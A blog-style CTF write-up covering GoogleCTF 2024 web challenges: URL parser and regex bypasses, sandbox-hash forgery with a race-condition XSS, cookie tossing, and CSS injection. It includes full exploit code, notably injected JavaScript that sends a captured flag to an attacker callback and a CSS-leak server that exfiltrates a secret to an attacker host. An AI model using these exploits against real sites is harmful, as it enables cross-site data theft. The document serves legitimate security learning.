---
title: GoogleCTF 2024 Writeups
date: 2024-06-28 11:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/google-ctf-2024-writeup/cover-en.png
---

For the past half year, I have been busy with other things and haven't had a chance to participate in a CTF. This time, I made time for GoogleCTF 2024 and solved all the web challenges with my teammates.

The challenges were interesting as always. I participated in three of them, while my teammates quickly solved the other two simpler ones before I could even take a look. Nevertheless, I will make a brief record of them. I really enjoy CTF challenges that are mostly client-side focused.

Keywords:

1. Bypassing URL parser
2. Adding strings after parseInt
3. [a-Z] regex includes special characters
4. Cookie tossing
5. CSS injection

<!-- more -->

## GRAND PRIX HEAVEN (67 solves)

My teammates were too fast, and they solved it before I could join in.

The core code snippet is as follows:

``` js
app.get("/fave/:GrandPrixHeaven", async (req, res) => {
  const grandPrix = await Configuration.findOne({
    where: { public_id: req.params.GrandPrixHeaven },
  });
  if (!grandPrix) return res.status(400).json({ error: "ERROR: ID not found" });
  let defaultData = {
    0: "csp",
    1: "retrieve",
    2: "apiparser",
    3: "head_end",
    4: "faves",
    5: "footer",
  };
  let needleBody = defaultData;
  if (grandPrix.custom != "") {
    try {
      needleBody = JSON.parse(grandPrix.custom);
      for (const [k, v] of Object.entries(needleBody)) {
        if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
          throw new Error("invalid template piece");
        // don't be sneaky. We need a CSP!
        if (parseInt(k) == 0 && v != "csp") throw new Error("No CSP");
      }
    } catch (e) {
      console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
      return res.status(400).json({ error: "invalid custom body" });
    }
  }
  needle.post(
    TEMPLATE_SERVER,
    needleBody,
    { multipart: true, boundary: BOUNDARY },
    function (err, resp, body) {
      if (err) {
        console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
        return res.status(500).json({ error: "error" });
      }
      return res.status(200).send(body);
    }
  );
});
```

The `needleBody` is controllable, and the main issue lies in the validation of the key and value. The key validation `isNum(parseInt(k))` is flawed because the `parseInt` conversion is very loose. For example, `parseInt('123hello')` becomes `123`, allowing arbitrary strings to be appended after numbers to bypass validation.

Since the `boundary` is known, data can be smuggled in through the key.

A request is then sent to TEMPLATE_SERVER, which processes it as follows:

``` js
const templates = require('./templates');

const parseMultipartData  = (data, boundary) => {
  var chunks = data.split(boundary);
  // always start with the <head> element
  var processedTemplate = templates.head_start;
  // to prevent loading an html page of arbitrarily large size, limit to just 7 at a time
  let end = 7;
  if (chunks.length-1 <= end) {
    end = chunks.length-1;
  }
  for (var i = 1; i < end; i++) {
    // seperate body from the header parts
    var lines = chunks[i].split('\r\n\r\n')
    .map((item) => item.replaceAll("\r\n", ""))
    .filter((item) => { return item != ''})
    for (const item of Object.keys(templates)) {
        if (lines.includes(item)) {
            processedTemplate += templates[item];
        }
    }
  }
  return processedTemplate;
}
```

As mentioned above, we can add our own content and prevent it from being rendered by the CSP.

There is a bypass in the frontend part as well:

``` js
constructor(url) {
  const clean = (path) => {
    try {
      if (!path) throw new Error("no path");
      let re = new RegExp(/^[A-z0-9\s_-]+$/i);
      if (re.test(path)) {
        // normalize
        let cleaned = path.replaceAll(/\s/g, "");
        return cleaned;
      } else {
        throw new Error("regex fail");
      }
    } catch (e) {
      console.log(e);
      return "dfv";
    }
    };
  url = clean(url);
  this.url = new URL(url, 'https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/');
}
```

The check for `A-z` here is crucial because some symbols are included, such as `\`, allowing the URL to be `\test` and overwrite the original path `/api/get-car`.

The above is just a simple record. For a more detailed walkthrough and the challenges, you can refer to the author's writeup: [GoogleCTF 2024 GRAND PRIX HEAVEN Solution](https://github.com/google/google-ctf/tree/main/2024/quals/web-grandprixheaven/solution)

## SAPPY (64 solves)

Once again, my teammates solved this before I could take a look. I'll briefly discuss the core concept and note the Discord discussion.

The core code snippet is as follows:

``` js
const Uri = goog.require("goog.Uri");

function validate(host) {
  const h = Uri.parse(host);
  if (h.hasQuery()) {
    throw "invalid host";
  }
  if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com") {
    throw "invalid host";
  }
  return host;
}
```

Essentially, the challenge is to bypass this check and allow the input URL to send requests to our server.

Two bypass methods were observed. One is using a data URI: `data://sappy-web.2024.ctfcompetition.com/;base64,...`, where the domain is resolved as `sappy-web.2024.ctfcompetition.com` by this library.

The other method is `\\\\www%2eURL%2ex://sappy-web.2024.ctfcompetition.com`, tricking the parser into recognizing `\\\\www%2eURL%2ex` as the scheme. However, browsers interpret `\\` as `//`, resulting in `https://www.URL.ex//sappy-web.2024.ctfcompetition.com`.

For a more detailed process, you can refer to this article: [GoogleCTF 2024 SAPPY](https://zimzi.substack.com/p/googlectf-2024-sappy)

## POSTVIEWER V3 (19 solves)

I couldn't solve [v1](https://blog.huli.tw/2022/07/09/en/google-ctf-2022-writeup/#postviewer-10-solves) in 2022 or [v2](https://blog.huli.tw/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/#postviewer-v2-7-solves) in 2023, but I finally managed to solve v3 released this year.

The core concept of this year's version is similar to the previous ones, aiming to create a preview file mechanism with a sandbox. The interface is simple, with just a feature to upload files:

![upload file](/img/google-ctf-2024-writeup/p1.png)

After clicking the file, the hash value on the URL will be updated, and this hash value is `sha1(filename)`. Then, based on the file name, the content is retrieved from IndexedDB, and that's when the crucial part begins.

After obtaining the content, a sandbox domain is generated. The name of this domain depends on: `calculateHash(body, product, window.origin, location.href)`, where the body is a fixed HTML and the product is also fixed.

Next, an iframe is used to load this sandbox domain, and the query string is appended with: `?o=${window.origin}`. Below is an example:

```
https://sbx-0wguyijf8lspklnc3724kqvia43l62tu7v1l2gdelcy503m2cd.
  postviewer3-web.2024.ctfcompetition.com/postviewer/shim.html
  ?o=https%3A%2F%2Fpostviewer3-web.2024.ctfcompetition.com
```

So, what does this `shim.html` do? The content is quite simple, focusing only on JavaScript-related paragraphs:

``` js
const HASH_REGEXP = /^sbx-([a-z0-9]{50})[.]/;
const PRODUCT_REGEXP = /[/]([a-z0-9_-]*)[/]shim.html/;
let FILE_HASH, PRODUCT

function _throw(err){
  document.body.innerText = err;
  throw Error(err);
}

try{
  FILE_HASH = HASH_REGEXP.exec(location.host)[1];
}catch(e){
  _throw("Incorrect hash");
}

try{
  PRODUCT = PRODUCT_REGEXP.exec(location.pathname)[1];
}catch(e){
  _throw("Incorrect product");
}

const TRUSTED_ORIGIN = new URL(location.href).searchParams.get('o');
if(!/^https?:\/\//.test(TRUSTED_ORIGIN)) {
    _throw("Untrusted Origin");
}

function arrayToBase36(arr) {
  return arr
    .reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0))
    .toString(36);
}

async function calculateHash(...strings){
  const encoder = new TextEncoder();
  const string = strings.join('');
  const hash = await crypto.subtle.digest('SHA-256', encoder.encode(string));
  return arrayToBase36(new Uint8Array(hash)).padStart(50, '0').slice(0, 50);
}

window.onmessage = async (e) => {
    if(e.origin !== TRUSTED_ORIGIN){
        _throw("Wrong origin");
    }
    if (e.data.body === undefined || !e.data.mimeType) {
        _throw("No content to render");
    };

    const {body, salt, mimeType} = e.data;
    [body, salt, mimeType, PRODUCT, TRUSTED_ORIGIN].forEach(e=>{
      if (typeof e !== 'string') {
        _throw(`Expected '${e}' to be a string.`);
      }
    });
    const hash = await calculateHash(body, PRODUCT, TRUSTED_ORIGIN, salt);
    if (hash !== FILE_HASH) {
      _throw(`Expected hash: ${hash}`);
    }

    const blob = new Blob([body], { type: mimeType });
    window.onmessage = null;
    e.source.postMessage('blob loaded', e.origin);
    location.replace(URL.createObjectURL(blob));
};
```

Essentially, it checks a few things:

1. Whether the origin of `onmessage` matches the origin in the URL
2. After hashing the incoming data, whether it matches the domain name

If both conditions are met, the incoming body is turned into a blob and loaded into this blob.

Now, let's go back to the iframe mentioned earlier. After the iframe in `shim.html` finishes loading, it sends a postMessage to this iframe, passing the fixed HTML mentioned earlier, which is:

``` html
<html>
  <head>
    <meta charset="utf-8">
    <title>Evaluator</title>

    <script>
      onmessage = e => {
        if(e.source !== parent) {
          throw /not parent/;
        };
        if(e.data.eval){
          eval(e.data.eval);
        }
      }
      onload = () => {
        parent.postMessage('loader ready','*');
      }
    </script>

    <style>
      body{
        padding: 0px;
        margin: 0px;
      }
      iframe{
        width: 100vw;
        height: 100vh;
        border: 0;
      }
      .spinner {
        background: url(https://storage.googleapis.com/gctf-postviewer/spinner.svg) center no-repeat;
      }
      .spinner iframe{
        opacity: 0.2
      }
    </style>
  </head>
  <body>
    <div id="container" class="spinner"></div>
  </body>
</html>
```

Therefore, the content of the iframe will become the above HTML, simply evaluating the passed parameters.

In the final step, a postMessage is sent to this iframe, including the file's content and mimeType, and then the following code is evaluated:

``` js
const container = document.querySelector("#container");
container.textContent = '';
const iframe = document.createElement('iframe');
iframe.src = URL.createObjectURL(new Blob([e.data.body], {type: e.data.type}));
if(e.data.sandbox) {
  iframe.sandbox = e.data.sandbox;
}
container.appendChild(iframe);
setTimeout(()=>{
  container.classList.remove('spinner');
}, 5000);
iframe.onload = () => {
  setTimeout(()=>{
    container.classList.remove('spinner');
  }, 500);
};
```

Thus, within this iframe, there will be another sandboxed iframe containing the file's content.

Seems complex, right? I had to go through it several times to understand the entire process and even drew a diagram for reference:

![flow](/img/google-ctf-2024-writeup/p2.png)

While solving this challenge, initially, I wondered if these `onmessage` events could be compromised, but upon further thought, I realized it was not possible.

All iframes validate against `source.origin`, preventing messages from unauthorized origins. On the other hand, it's evident that we can obtain some sandbox XSS, simply by calculating a hash with our own origin.

However, having a random sandbox XSS is not useful. Is it possible to obtain a sandbox domain XSS that contains the flag?

The hash for generating the domain consists of the following four elements:

1. body (fixed)
2. product (fixed)
3. window.origin (fixed)
4. location.href (includes hash, but we don't know the hash content)

My initial thought was, could we manipulate the code at this point to reset `location.hash` to empty, making all content known and allowing us to calculate the hash?

The code for handling the hash is as follows:

``` js
const processHash = async () => {
  safeFrameModal.hide();
  if (location.hash.length <= 1) return;
  const hash = location.hash.slice(1);
  if (hash.length < 5) {
    const id = parseInt(hash);
    location.hash = filesList.querySelectorAll('a')[id].id;
    return;
  }
  const fileDiv = document.getElementById(hash);
  if (fileDiv === null || !fileDiv.dataset.name) return;
  previewIframeDiv.textContent = '';
  await sleep(0);
  previewFile(db.getFile(fileDiv.dataset.name), previewIframeDiv);
  /* If modal is not shown remove hash */
  setTimeout(() => {
    if (!previewModalDiv.classList.contains('show')) {
      location.hash = '';
    }
  }, 2000);
}

window.addEventListener('hashchange', processHash, true);
```

There is an `await sleep(0)` in the middle, making the subsequent operations asynchronous. Theoretically, we could create a race condition to obtain a hash of `#0`, which then becomes the flag file ID. However, when it reaches `previewFile`, `location.hash` changes to `#`.

Upon further consideration, I realized this approach was also futile because the trusted origin remains the domain of the challenge. Even if we knew the hash, we couldn't take any action.

But shortly after, I revisited the code for generating the hash:

``` js
async function calculateHash(...strings) {
  const encoder = new TextEncoder();
  const string = strings.join("");
  const hash = await crypto.subtle.digest("SHA-256", encoder.encode(string));
  return arrayToBase36(new Uint8Array(hash)).padStart(50, "0").slice(0, 50);
}
```

Here, the four parameters passed are simply concatenated together. For this challenge, each parameter is as follows:

```
body: BODY
product: postviewer
origin: https://postviewer3-web.2024.ctfcompetition.com
href: https://postviewer3-web.2024.ctfcompetition.com/#file-sha1-hash
```

The resulting concatenation is:

```
BODYpostviewer{CHALL_ORIGIN}{CHALL_ORIGIN}/#file-sha1-hash
```

If we could truly control the hash, it could become like this:

```
BODYpostviewer{CHALL_ORIGIN}{CHALL_ORIGIN}/#postviewerhttps://example.com
```

In this case, the output below would yield the same result:

```
body: BODYpostviewer{CHALL_ORIGIN}{CHALL_ORIGIN}/#
product: postviewer
origin: https://example.com
href: ''
```

At this point, the `origin` has become our own domain, so we can forge a sandbox domain with the same hash and trust our own origin.

Once we have the sandbox XSS, it's simple. My original idea was since it's now same-origin, just overwrite `onmessage` or `Blob`, intercept the input, as the iframe containing the flag cannot be accessed because the origin will be null.

In summary, the idea is roughly as above. However, the most difficult part is how to trigger this race condition. My own exploit is as follows:

``` html
<body>
  <div id=log></div>
</body>
<script>
  const sleep = ms => new Promise(r => setTimeout(r, ms))
  const callbackUrl = window.origin
  const evaluatorHtml = `{NOT_IMPORTANT}`;

  function arrayToBase36(arr) {
    return arr
      .reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0))
      .toString(36);
  }

  async function calculateHash(...strings){
    const encoder = new TextEncoder();
    const string = strings.join('');
    const hash = await crypto.subtle.digest('SHA-256', encoder.encode(string));
    return arrayToBase36(new Uint8Array(hash)).padStart(50, '0').slice(0, 50);
  }

  async function getSandboxXss() {
    return new Promise(async (resolve) => {
      const selfOrigin = window.origin
      const PRODUCT = 'postviewer'
      const data = {
        body: evaluatorHtml + 'postviewerhttps://postviewer3-web.2024.ctfcompetition.comhttps://postviewer3-web.2024.ctfcompetition.com/#',
        salt: '',
        mimeType: 'text/html; charset=utf-8'
      }

      const hash = await calculateHash(data.body, PRODUCT, selfOrigin, data.salt);
      log.innerText += 'hash:' + hash

      const url = `https://sbx-${hash}.postviewer3-web.2024.ctfcompetition.com/postviewer/shim.html?o=${encodeURIComponent(selfOrigin)}`
      const iframe = document.createElement('iframe')
      iframe.src = url
      iframe.onload = function() {
        iframe.contentWindow.postMessage(data, '*')
        setTimeout(() => {
          iframe.contentWindow.postMessage({
            eval: `fetch('${callbackUrl}/step_1_xss');
            
            let stop = false

            for(let i=1; i<=3; i++) {
              fetch('${callbackUrl}/open_' + i)

              let win = window.open("https://postviewer3-web.2024.ctfcompetition.com/")
              
              setTimeout(() => {
                setInterval(function() {
                  if (stop) return
                  win.location = "https://postviewer3-web.2024.ctfcompetition.com/#0"
                }, 2)

                setInterval(function(){
                  if (stop) return
                  win.location = "https://postviewer3-web.2024.ctfcompetition.com/#postviewer${window.origin}"
                }, 6)

                setInterval(function() {
                  if (stop) return
                  try {
                    win.frames[0].origin
                    stop = true
                    
                    fetch('${callbackUrl}/correct_sandbox')
                    win.frames[0].onmessage = function(e) {
                      fetch('${callbackUrl}/flag', { method: 'POST', body: JSON.stringify(e.data) })
                    }
                    win.frames[0].Blob = function(a) {
                      fetch('${callbackUrl}/ping')
                      fetch('${callbackUrl}/flag', { method: 'POST', body: a })
                    }
                  } catch (err) {}
                }, 2)
              }, 500)
            }
            `
          }, '*')
          resolve()
        }, 1000)
      }
      document.body.appendChild(iframe)
    })
  }

  async function main() {
    fetch('/start')
    await getSandboxXss()
  }
  main()
</script>
```

Basically, it involves opening three intervals, one to update to `#0`, one to update to what we want, and another to continuously override the function of the flag iframe. After observing, I found that I successfully XSS a few times, but then there was no follow-up. Either the code was written incorrectly, or the modal was closed too quickly.

While I was still experimenting, my teammate managed to solve it. The concept was similar, with the only difference being the numbers in the intervals and the method used to retrieve the flag in the end.

Although the flag content is a sandboxed iframe, the webpage loading this iframe is same-origin. Therefore, we can directly fetch the iframe's src (which will be a blob) because it is also same-origin.

In conclusion, race conditions are really difficult, and even if discovered, they may not always be exploitable.

The official solution provided by the author terjanq can be found here: [Google CTF 2024 Quals Web Postviewer3](https://github.com/google/google-ctf/tree/main/2024/quals/web-postviewer3)

There is an additional step in the middle to find an XSS on `storage.googleapis.com`, but the overall concept remains the same, just the method of forging the hash is different.

## GAME ARCADE (14 solves)

This question is quite similar to POSTVIEWER V3, with many pieces of code even being shared or improved versions, almost like giving hints to POSTVIEWER V3 secretly (?).

The functionality involves four mini-games, where clicking on them will load fixed HTML using a sandbox domain + shim.html (basically the same shim as POSTVIEWER V3).

The method of calculating the sandbox hash here is different from before, using special symbols for joining, making it impossible to forge.

Among the four mini-games, one is clearly not a game. Some parts of the code are as follows:

``` js
let password = getCookie('password') || localStorage.getItem('password') || "okoń";
let correctPasswordSpan = document.createElement('span');
correctPasswordSpan.classList.add('correct');
correctPasswordSpan.innerHTML = password;
let steps = 0;
function savePassword(pwd){
  document.cookie = `password=${pwd}`;
  localStorage.setItem('password', pwd)
  return pwd;
}
        
function changePwd(){
  steps = 0;
  password = passwordInp.value;
  correctPasswordSpan.innerHtml = password;
  output.innerHTML = 'Password changed.';
  savePassword(password);
}
```

The bot in this question ultimately writes the flag by using `changePwd`, so the goal is to execute XSS and steal the password stored in the cookie or localStorage.

From the above code, it is clear that if we can overwrite the cookie, we can have an XSS.

Why is that? Because the password is controllable, and `correctPasswordSpan.innerHTML = password`, even though `correctPasswordSpan` is not displayed on the screen, there is still an XSS risk. A real-world example can be seen in the Figma XSS found by me and @sudi: [Interesting case of a DOM XSS in www.figma.com](https://github.com/Sudistark/xss-writeups/blob/main/figma.com-xss.md)

To overwrite the cookie, one immediate thought is to use cookie tossing from another domain, but in this case, `*.usercontent.goog` is in the public suffix list, so it's not possible to write from other subdomains.

Coincidentally, my teammate had an idea while solving POSTVIEWER V3 that could be used here. He suggested that maybe we could construct a domain like `http://sbx-fake.sbx-real.postviewer3-web.2024.ctfcompetition.com/`, which wasn't useful in that challenge but turned out to be the solution here.

The domain we want to influence is https://0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html

We can construct an HTTP subdomain XSS: http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-h641507400.0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html

To start cookie tossing from this subdomain is enough (actually, the real domain needs to be calculated using your origin, the above is just an example to prove that subdomain is feasible).

The author's writeup is here: [https://github.com/google/google-ctf/tree/main/2024/quals/web-game-arcade](https://github.com/google/google-ctf/tree/main/2024/quals/web-game-arcade)

After reading it, I realized that Chrome cannot use cookies inside a blob.

Also, like the author, I was curious why this challenge seemed simpler, yet fewer teams solved it. I guess maybe they didn't think of constructing a subdomain? If it weren't for my teammate's reminder, I might not have thought of it either.

## IN-THE-SHADOWS (5 solves)

The core code of this challenge is very simple:

``` js
const UNSAFE_CSS_REGEX = /(@import|url[(])/i;

/**
 * @param {string} stylesheetText
 */
function sanitizeStyleSheet(stylesheetText) {
  // Early exit for imports and external URLs
  if (UNSAFE_CSS_REGEX.test(stylesheetText)) {
    return "";
  }
  const sheet = new CSSStyleSheet();
  sheet.replaceSync(stylesheetText);
  for (let i = sheet.cssRules.length - 1; i >= 0; i--) {
    const rule = sheet.cssRules[i];
    if (shouldDeleteRule(rule)) {
      sheet.deleteRule(i);
    }
  }
  const safeCss = Array.from(sheet.cssRules)
    .map((r) => r.cssText)
    .join("\n");

  // Do the check again if somehow @import or url() reappears during re-serialization.
  if (UNSAFE_CSS_REGEX.test(safeCss)) {
    return "";
  }
  return safeCss;
}

/**
 * @param {CSSRule} rule
 * @returns {boolean}
 */
function shouldDeleteRule(rule) {
  if (
    rule instanceof CSSImportRule ||
    rule instanceof CSSMediaRule ||
    rule instanceof CSSFontFaceRule ||
    rule instanceof CSSLayerBlockRule ||
    rule instanceof CSSLayerStatementRule ||
    rule instanceof CSSNamespaceRule ||
    rule instanceof CSSSupportsRule ||
    rule instanceof CSSPageRule ||
    rule instanceof CSSPropertyRule
  ) {
    return true;
  }
  // :has, :before etc. are potentially dangerous.
  if (rule instanceof CSSStyleRule && rule.selectorText.includes(":")) {
    return true;
  }
  return false;
}
```

Simply put, you can insert a `<style>` tag inside a shadow DOM, but the content of the tag will be filtered by the rules above, and the goal is to steal the secret attribute of the parent body, which looks like: `00ae32216ba630c797e19594d51fc2da0b5b7d6600000000e56c64a39f94843840757e667798110efb32fac16789565d66efb62c4a0492c6`

When looking at this challenge initially, it was obvious that CSS injection was needed to steal something, and there were two difficulties:

1. How to steal elements outside the shadow DOM
2. How to bypass the sanitizer

My teammate first looked at this challenge. The first issue can be solved using `:host-context(body[secret^="00"])` selector, which can select things outside the shadow DOM.

For the second issue, you can use rules other than the blocked ones, such as `@scope` or `@container`:

``` html
<style>
  .container{
    container-type: inline-size;
  }

  @container (min-width: 500px) {
    :host-context(body[secret^="00"]) p { 
      color: red;
    }
  }
</style>
<div class="container">
  <p>test</p>
</div>
```

The reason this can bypass the check is that the rule checking is not recursive; it only checks the top level. So, as long as the selector is hidden inside `@container`, it won't be checked.

After solving these two issues, the next step is to steal the content.

Since `@import` and `url` are blocked, you can't leak using only CSS; you need HTML's help, such as the commonly used lazy-loading image.

Set an img to `display:none` and add `loading=lazy` first, so it won't make a request. Then, set it to `display:block` using CSS, and it will make a request (I remember trying this before, but it always made a request no matter what, either I remembered wrong, or Chrome has changed the mechanism in between).

Therefore, you can generate a payload based on this, with the general content as follows:

``` html
<style>
  img {
    display:none;
  }
  .container{
    container-type: inline-size;
  }
  @container (min-width: 100px) {
    :host-context(body[secret*="00"]){ 
      .i00{ display:flex; }
    }
    :host-context(body[secret*="01"]){ 
      .i01{ display:flex; }
    }
  }
</style>
<div class="container">
  <img class=i00 loading=lazy src="URL?i00" />
  <img class=i01 loading=lazy src="URL?i01" />
</div>
```

However, there is a character limit for the payload in this challenge. After testing, it was found that you can only have around 13000 characters at most, which is clearly not enough.

We want to leak bigrams, so we need 256 characters from 00 to ff, 13000 / 256 = 50. You will definitely need `:host-context(body[secret*="00"]){}` which is already 35 characters, leaving only 15 characters, unless there is a URL available, it won't be possible.

(By the way, there is a [src()](https://drafts.csswg.org/css-values/#urls) in the CSS spec, which seems to be an alternative usage of URL, but it doesn't work, it seems it's not implemented yet).

Even if it could be done, there is another problem, too many characters leading to a high repetition rate.

The secret has 112 characters, so if it's bigrams, there will be 111 pairs. But after testing several times, having 93 pairs is already difficult, meaning there are 18 pairs that are duplicates. Therefore, you must brute-force a bit, but C(93, 18) = 7282746847637522000, which doesn't seem like a number that can be brute-forced.

Therefore, this approach is likely wrong and not feasible.

So, what other direction is there? Another direction is to use existing mechanisms to bypass the check.

The sanitizer will eventually return safeCss, which is made up of the cssText of each rule. If you can make the final cssText have characters like `@impor\74`, you can bypass the final check.

Then, my teammate found that `@font-feature-values 'lol {}; @import "lol.com";p'` after extracting the cssText, will directly remove the single quotes. And after removing the quotes, it's obvious that the meaning of the CSS changes.

Based on this, you can provide an input like this:

``` html
<style>
  @font-feature-values 'lol; @\\0069mport "//exp.com";p' {}
</style>
```

After extracting cssText, it will become:


``` html
<style>
  @font-feature-values 'lol;
  @\0069mport "//exp.com";
  p {}
</style>
```

Successfully smuggled in the `@import`, then you can use common methods to leak the characters.

Speaking of this, it feels like I should prepare a CSS injection server that can be used on the fly, otherwise, it's a bit tiring to write from scratch every time.

This time I directly used the trigram I wrote for [0CTF 2023](https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/), but it's a bit buggy. I didn't consider it well when reassembling the characters, so it takes many attempts and good luck to get the correct answer.

After trying and fixing it for an hour in a trial-and-error state, I was lucky enough to get the flag.

By the way, according to the post-competition discussion on Discord, this bug has been fixed recently: [Properly escape CSS identifiers in serialization.](https://chromium-review.googlesource.com/c/chromium/src/+/5604769)

Finally, here is the complete but unstable exploit:

``` js
const express = require('express')

const app = express()
const port = 5555

let leaks = []
const BASE = 'https://your_server.com'

// prepare payload
let chars = '0123456789abcdef'

let arr = []
for(let a of chars) {
    for(let b of chars) {
        for(let c of chars) {
            let str = a+b+c;
            arr.push(str)
        }
    }
}

let payload1 = ''
let crossPayload1 = 'url("/")'
let payload2 = ''
let crossPayload2 = 'url("/")'
let payload3 = ''
let crossPayload3 = 'url("/")'

const third = Math.floor(arr.length / 3);
const arr1 = arr.slice(0, third); 
const arr2 = arr.slice(third, 2 * third); 
const arr3 = arr.slice(2 * third); 

for(let str of arr1) {
    payload1 += `:host-context(*[secret*="${str}"]){--${str}:url("${BASE}/leak?q=${str}")}\n`
    crossPayload1 = `-webkit-cross-fade(${crossPayload1}, var(--${str}, none), 50%)`
}

for(let str of arr2) {
    payload2 += `:host-context(*[secret*="${str}"]){--${str}:url("${BASE}/leak?q=${str}")}\n`
    crossPayload2 = `-webkit-cross-fade(${crossPayload2}, var(--${str}, none), 50%)`
}

for(let str of arr3) {
    payload3 += `:host-context(*[secret*="${str}"]){--${str}:url("${BASE}/leak?q=${str}")}\n`
    crossPayload3 = `-webkit-cross-fade(${crossPayload3}, var(--${str}, none), 50%)`
}

payload1 = `${payload1} .p1{background-image:${crossPayload1} }`
payload2 = `${payload2} .p2{background-image:${crossPayload2} }`
payload3 = `${payload3} .p3{background-image:${crossPayload3} }`

function filterFirst(arr, item) {
  const result = []
  let found = false
  for(let a of arr) {
    if (a===item && !found) {
      found = true
      continue
    }
    result.push(a)
  }
  return result
}

async function getFlag(secret) {
  return fetch('https://in-the-shadows-web.2024.ctfcompetition.com/check-secret?secret=' + secret).then(res => res.text()).then((text) => {
    if (text !== 'Invalid secret') {
      console.log(text)
    }
  }).catch(err => console.log('err', err.message))
}

function mergeWords(arr, ending) {
  if (arr.length === 0) return ending
  if (!ending) {
    for(let i=0; i<arr.length; i++) {
      let isFound = false
      for(let j=0; j<arr.length; j++) {
        if (i === j) continue

        let suffix = arr[i][1] + arr[i][2] 
        let prefix = arr[j][0] + arr[j][1]

        if (suffix === prefix) {
          isFound = true
          continue
        }
      }
      if (!isFound) {
        console.log('ending:', arr[i])
        return mergeWords(filterFirst(arr, arr[i]), arr[i])
      }
    }

    console.log('Error, please try again')
    return
  }

  let found = []
  for(let i=0; i<arr.length; i++) {
    let length = ending.length
    let suffix = ending[0] + ending[1]
    let prefix = arr[i][1] + arr[i][2]

    if (suffix === prefix) {
      found.push([filterFirst(arr, arr[i]), arr[i][0] + ending])
    }
  }

  return found.map((item) => {
    return mergeWords(item[0], item[1])
  })
}

function handleLeak() {
  let str = ''
  let arr = [...leaks]
  leaks = []

  console.log('received:', JSON.stringify(arr))
  const merged = mergeWords(arr, null);
  console.log('leaked:', merged.flat(9999))
  return merged.flat(9999)
}

app.get('/leak', async (req, res) => {
  leaks.push(req.query.q)
  
  console.log('recevied:', req.query.q, leaks.length)
  //console.log(leaks)
  if (leaks.length === 105) {
    const result = handleLeak()
    
    let s = Array.from(new Set(result))
    s = s.filter(item => {
      if (item.indexOf('000') !== 40) {
        return false
      }
      return true
    })
    console.log('secret:', s)
    let i = 0
    for(let f of s) {
      console.log('try:', f, ++i)
      await getFlag(f.replace('000', '00000000'))
    }
    
  }
  res.send('ok')
})

app.get('/payload1', (req, res) => {
  console.log('payload1')
  res.setHeader('Content-Type', 'text/css')
  res.send(payload1)
})

app.get('/payload2', (req, res) => {
  console.log('payload2')
  res.setHeader('Content-Type', 'text/css')
  res.send(payload2)
})

app.get('/payload3', (req, res) => {
  console.log('payload3')
  res.setHeader('Content-Type', 'text/css')
  res.send(payload3)
})

app.get('/payload', (req, res) => {
  console.log('payload')
  let payload = `@import url("${BASE}/payload1");\n@import url("${BASE}/payload2");\n@import url("${BASE}/payload3");`
  res.setHeader('Content-Type', 'text/css')
  res.send(payload)
})

app.listen(port, async () => {
  console.log(`Example app listening on port ${port}`)
  
  setTimeout(() => {
    sendToBot(`<style>@font-feature-values 'lol; @\\\\0069mport "${BASE}/payload";p' {}</style><p class="p1"></p><p class="p2"></p><p class="p3"></p>`)
  }, 1000)
})

function sendToBot(payload) {
  fetch('https://in-the-shadows-web.2024.ctfcompetition.com/share-with-admin?body=' + encodeURIComponent(payload)).then(r => r.text()).then(console.log)
}
```
